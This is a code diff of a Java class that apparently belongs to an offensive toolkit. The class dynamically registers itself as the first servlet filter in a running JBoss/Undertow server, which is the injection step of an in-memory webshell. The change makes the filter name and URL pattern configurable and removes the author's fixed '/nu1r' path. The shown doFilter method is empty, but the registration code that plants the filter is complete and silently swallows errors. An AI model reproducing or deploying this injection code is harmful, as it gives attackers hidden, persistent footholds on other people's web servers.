@@ -22,10 +22,11 @@ import static org.fusesource.jansi.Ansi.ansi;
  */
 public class JBFMSFromContextF implements Filter {
 
+    public static String pattern;
+
     static {
         try {
-            String filterName = "nu1r" + System.nanoTime();
-            String urlPattern = "/nu1r";
+            String filterName = String.valueOf(System.nanoTime());
 
             HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
             ServletContext         context = request.getServletContext();
@@ -38,7 +39,6 @@ public class JBFMSFromContextF implements Filter {
             if (!filters.containsKey(filterName)) {
 
                 Class      clazz  = JBFMSFromContextF.class;
-
                 FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
                 deploymentInfo.addFilter(filter);
 
@@ -51,7 +51,7 @@ public class JBFMSFromContextF implements Filter {
                 deployment.getFilters().addFilter(filter);
 
                 // 0 表示把我们动态注册的 filter 放在第一位
-                deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);
+                deploymentInfo.insertFilterUrlMapping(0, filterName, pattern, DispatcherType.REQUEST);
             }
         } catch (Exception ignored) {
         }
@@ -63,7 +63,6 @@ public class JBFMSFromContextF implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-
     }
 
     @Override
